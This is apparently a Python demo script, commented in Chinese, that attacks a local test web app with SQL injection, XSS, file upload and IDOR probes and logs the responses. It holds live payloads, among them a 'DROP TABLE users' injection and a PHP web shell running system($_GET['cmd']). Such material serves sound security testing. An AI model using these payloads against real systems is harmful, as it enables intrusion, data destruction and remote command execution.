import requests
import time
import random
import json
from datetime import datetime

"""
此脚本用于模拟对Web应用的各种攻击，并记录结果
可用于生成测试数据和演示漏洞影响
"""

# API基础URL
BASE_URL = "http://localhost:5000"

def simulate_sql_injection():
    """模拟SQL注入攻击"""
    print("模拟SQL注入攻击...")
    
    # 正常查询
    response = requests.get(f"{BASE_URL}/api/users?username=admin")
    print(f"正常查询结果: {response.status_code}")
    
    # SQL注入攻击
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password, '', '', '' FROM users --",
        "admin'; --"
    ]
    
    for payload in payloads:
        try:
            start_time = time.time()
            response = requests.get(f"{BASE_URL}/api/users?username={payload}")
            end_time = time.time()
            
            print(f"SQL注入payload: {payload}")
            print(f"响应状态码: {response.status_code}")
            print(f"响应时间: {(end_time - start_time)*1000:.2f}毫秒")
            print(f"响应内容: {response.text[:100]}...\n")
            
            # 记录攻击日志
            log_attack("SQL注入", payload, response.status_code, end_time - start_time)
            
            # 休息一会儿，避免请求过快
            time.sleep(0.5)
        except Exception as e:
            print(f"攻击时出错: {str(e)}")

def simulate_xss_attack():
    """模拟XSS攻击"""
    print("模拟XSS攻击...")
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(\"XSS\")'>",
        "<svg onload='alert(\"XSS\")'>",
        "<body onload='alert(\"XSS\")'>",
        "javascript:alert('XSS')",
    ]
    
    for payload in xss_payloads:
        try:
            start_time = time.time()
            response = requests.post(
                f"{BASE_URL}/api/comments",
                json={"comment": payload}
            )
            end_time = time.time()
            
            print(f"XSS payload: {payload}")
            print(f"响应状态码: {response.status_code}")
            print(f"响应时间: {(end_time - start_time)*1000:.2f}毫秒")
            print(f"响应内容: {response.text}\n")
            
            # 记录攻击日志
            log_attack("XSS攻击", payload, response.status_code, end_time - start_time)
            
            time.sleep(0.5)
        except Exception as e:
            print(f"攻击时出错: {str(e)}")

def simulate_file_upload_attack():
    """模拟不安全文件上传攻击"""
    print("模拟不安全文件上传攻击...")
    
    malicious_files = [
        ("webshell.php", "<?php system($_GET['cmd']); ?>"),
        ("evil.js", "console.log('This is a malicious script')"),
        ("attack.html", "<script>alert('XSS via File Upload')</script>"),
        ("empty.exe", "MZ" + "A" * 100)  # 简化的EXE文件头
    ]
    
    for filename, content in malicious_files:
        try:
            start_time = time.time()
            
            # 创建临时文件
            with open(filename, "w") as f:
                f.write(content)
            
            with open(filename, "rb") as f:
                response = requests.post(
                    f"{BASE_URL}/api/upload",
                    files={"file": (filename, f)}
                )
            
            end_time = time.time()
            
            print(f"恶意文件: {filename}")
            print(f"响应状态码: {response.status_code}")
            print(f"响应时间: {(end_time - start_time)*1000:.2f}毫秒")
            print(f"响应内容: {response.text}\n")
            
            # 记录攻击日志
            log_attack("不安全文件上传", filename, response.status_code, end_time - start_time)
            
            # 删除临时文件
            import os
            if os.path.exists(filename):
                os.remove(filename)
            
            time.sleep(0.5)
        except Exception as e:
            print(f"攻击时出错: {str(e)}")

def simulate_idor_attack():
    """模拟不安全直接对象引用攻击"""
    print("模拟不安全直接对象引用(IDOR)攻击...")
    
    # 尝试访问不同用户ID
    for user_id in range(1, 10):
        try:
            start_time = time.time()
            response = requests.get(f"{BASE_URL}/api/user_data/{user_id}")
            end_time = time.time()
            
            print(f"访问用户ID: {user_id}")
            print(f"响应状态码: {response.status_code}")
            print(f"响应时间: {(end_time - start_time)*1000:.2f}毫秒")
            print(f"响应内容: {response.text}\n")
            
            # 记录攻击日志
            log_attack("IDOR攻击", f"访问用户ID: {user_id}", response.status_code, end_time - start_time)
            
            time.sleep(0.5)
        except Exception as e:
            print(f"攻击时出错: {str(e)}")

def log_attack(attack_type, payload, status_code, response_time):
    """记录攻击日志到本地JSON文件"""
    log_entry = {
        "timestamp": datetime.now().isoformat(),
        "attack_type": attack_type,
        "payload": payload,
        "status_code": status_code,
        "response_time_ms": response_time * 1000,
        "success": 200 <= status_code < 300
    }
    
    try:
        # 读取现有日志
        try:
            with open("attack_logs.json", "r") as f:
                logs = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            logs = []
        
        # 添加新日志
        logs.append(log_entry)
        
        # 保存日志
        with open("attack_logs.json", "w") as f:
            json.dump(logs, f, indent=2)
    except Exception as e:
        print(f"无法记录日志: {str(e)}")

def run_attack_simulation():
    """运行所有攻击模拟"""
    print("开始攻击模拟...\n")
    
    # 模拟SQL注入
    simulate_sql_injection()
    
    # 模拟XSS攻击
    simulate_xss_attack()
    
    # 模拟不安全文件上传
    simulate_file_upload_attack()
    
    # 模拟IDOR攻击
    simulate_idor_attack()
    
    print("\n攻击模拟完成。")

if __name__ == "__main__":
    run_attack_simulation() 